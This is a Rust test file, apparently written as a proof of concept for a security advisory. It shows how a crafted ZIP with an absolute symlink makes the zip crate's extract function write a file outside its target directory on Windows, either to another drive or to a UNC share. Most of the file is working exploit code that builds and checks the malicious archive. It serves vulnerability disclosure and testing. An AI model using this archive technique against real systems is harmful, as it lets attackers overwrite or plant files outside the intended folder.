//! Windows PoC: writing to a separate drive / UNC share via a single symlink (GHSA-hjqx-j4rw-g7xv)
//!
//! - author: sl91994
//!
//! The crafted ZIP contains only 2 entries:
//!   1. `a`          : a symlink whose target = `<OTHER>\<same tail as dest>\evil` (absolute path)
//!   2. `a/pwned.txt`: a regular file
//! During extraction, resolving `a` causes outpath to be replaced with `<OTHER>\...\evil`,
//! and `File::create(<OTHER>\...\evil\pwned.txt)` writes outside of dest.
//!
//! # Prerequisites
//! - Windows 10 (build 14972+) through Windows 11
//! - Symlink creation privilege `SeCreateSymbolicLinkPrivilege` = Developer Mode enabled, or run as Administrator.
//! - One volume / share **separate from dest**.
//!   Supply the escape destination via environment variables:
//!     * `POC_OTHER_DRIVE`: root of a separate drive. Must end with `\`. e.g. `D:\`
//!     * `POC_UNC_SHARE`: root of a writable UNC share. Must end with `\`.
//!       e.g. `\\localhost\poc\`
//!       (`net share poc=C:\path\to\share /grant:%USERNAME%,FULL`)
//!
//! # Running
//!
//! ```powershell
//! $env:POC_OTHER_DRIVE = "D:\"
//! $env:POC_UNC_SHARE   = "\\localhost\poc\"
//! cargo test --test poc_win -- --nocapture
//! ```

#![cfg(windows)]

use std::ffi::OsString;
use std::fs;
use std::io::{Cursor, Write};
use std::path::{Component, Path, PathBuf};

use tempfile::TempDir;
use zip::write::SimpleFileOptions;
use zip::{ZipArchive, ZipWriter};

/// Whether we have the privilege needed to create symlinks
fn have_symlink_privilege() -> bool {
    let Ok(tmp) = TempDir::new() else {
        return false;
    };
    let target = tmp.path().join("privcheck_target");
    let link = tmp.path().join("privcheck_link");
    if fs::write(&target, b"x").is_err() {
        return false;
    }
    std::os::windows::fs::symlink_file(&target, &link).is_ok()
}

/// Extract only the Normal components of a path (the tail, with prefix / root dropped)
fn normal_tail(p: &Path) -> Vec<OsString> {
    p.components()
        .filter_map(|c| match c {
            Component::Normal(s) => Some(s.to_os_string()),
            _ => None,
        })
        .collect()
}

/// Returns the `Prefix` (volume identifier) at the head of the path
fn volume_prefix(p: &Path) -> Option<OsString> {
    match p.components().next() {
        Some(Component::Prefix(pre)) => Some(pre.as_os_str().to_os_string()),
        _ => None,
    }
}

/// Verifies the single-symlink escape using the escape destination root `other_root` (a separate volume / share)
fn run_escape(variant: &str, other_root: &str) {
    if !have_symlink_privilege() {
        eprintln!(
            "[SKIP] [{variant}] missing SeCreateSymbolicLinkPrivilege; \
             enable Developer Mode or run as Administrator."
        );
        return;
    }

    // other_root must be an existing, writable root
    let other_root_path = PathBuf::from(other_root);
    if !fs::metadata(&other_root_path)
        .map(|m| m.is_dir())
        .unwrap_or(false)
    {
        eprintln!(
            "[SKIP] [{variant}] escape root {other_root:?} does not exist or is not a \
             directory; check the environment variable."
        );
        return;
    }

    // The extraction destination `dest` is a temp directory (usually on C:). Since the `base` used by
    // safe_prepare_path is the path after canonicalize, match the tail to that.
    let tmp = TempDir::new().unwrap();
    let dest = tmp.path().join("dest");
    fs::create_dir(&dest).unwrap();
    let canon_dest = fs::canonicalize(&dest).unwrap();
    let tail = normal_tail(&canon_dest);

    // Reproduce dest's tail on a separate volume as the escape destination, with evil/ underneath it.
    // Since simplified_components discards the prefix, the target's tail component sequence
    // prefix-matches the base's tail component sequence, passing the lexical check.
    let mut escape_dir = other_root_path.clone();
    for c in &tail {
        escape_dir.push(c);
    }
    escape_dir.push("evil");

    // Confirm it's actually a separate volume (if it's the same volume, it would land inside dest and not be an escape)
    let other_vol = fs::canonicalize(&other_root_path)
        .ok()
        .and_then(|p| volume_prefix(&p));
    let dest_vol = volume_prefix(&canon_dest);
    assert_ne!(
        other_vol, dest_vol,
        "[{variant}] escape root {other_root:?} is on the same volume as dest; \
         point it at a different drive/share (dest vol={dest_vol:?})."
    );

    // Assemble the crafted ZIP (entries: 1 symlink + 1 file)
    let target_str = escape_dir
        .to_str()
        .expect("escape path must be valid UTF-8")
        .to_string();
    println!("[{variant}] dest (canonical) = {}", canon_dest.display());
    println!("[{variant}] symlink target   = {target_str}");

    let mut zip = ZipWriter::new(Cursor::new(Vec::new()));
    let opt = SimpleFileOptions::default();
    // a: an absolute symlink pointing to the separate drive/share (passes the lexical check via matching tail)
    zip.add_symlink("a", &target_str, opt).unwrap();
    // a/pwned.txt: resolving `a` substitutes the drive in outpath, causing the write to land outside dest
    zip.start_file("a/pwned.txt", opt).unwrap();
    zip.write_all(b"escaped-on-windows!").unwrap();
    let archive = zip.finish_into_readable().unwrap();

    let res = ZipArchive::from(archive).extract(&dest);
    println!("[{variant}] extract() returned: {res:?}");

    res.expect("extract() failed");

    let escaped = escape_dir.join("pwned.txt");
    assert!(
        escaped.exists(),
        "[{variant}] escape failed: {} was not created",
        escaped.display()
    );

    let content = fs::read_to_string(&escaped).unwrap();
    println!(
        "[{variant}] WROTE OUTSIDE DEST: {} = {content:?}",
        escaped.display()
    );

    let _ = fs::remove_file(&escaped);
    let _ = fs::remove_dir(&escape_dir);

    assert_eq!(
        content, "escaped-on-windows!",
        "[{variant}] written content mismatch",
    );
}

/// Single-symlink escape to a separate drive (`POC_OTHER_DRIVE`, e.g. `D:\`)
#[test]
fn escape_via_second_drive() {
    match std::env::var("POC_OTHER_DRIVE") {
        Ok(root) if !root.is_empty() => run_escape("drive", &root),
        _ => eprintln!(
            "[SKIP] escape_via_second_drive: POC_OTHER_DRIVE not set \
             (PowerShell: `$env:POC_OTHER_DRIVE=\"D:\\\"`)."
        ),
    }
}

/// Single-symlink escape to a UNC share (`POC_UNC_SHARE`, e.g. `\\localhost\poc\`)
#[test]
fn escape_via_unc_share() {
    match std::env::var("POC_UNC_SHARE") {
        Ok(root) if !root.is_empty() => run_escape("unc", &root),
        _ => eprintln!(
            "[SKIP] escape_via_unc_share: POC_UNC_SHARE not set \
             (PowerShell: `$env:POC_UNC_SHARE=\"\\\\localhost\\poc\\\"`)."
        ),
    }
}
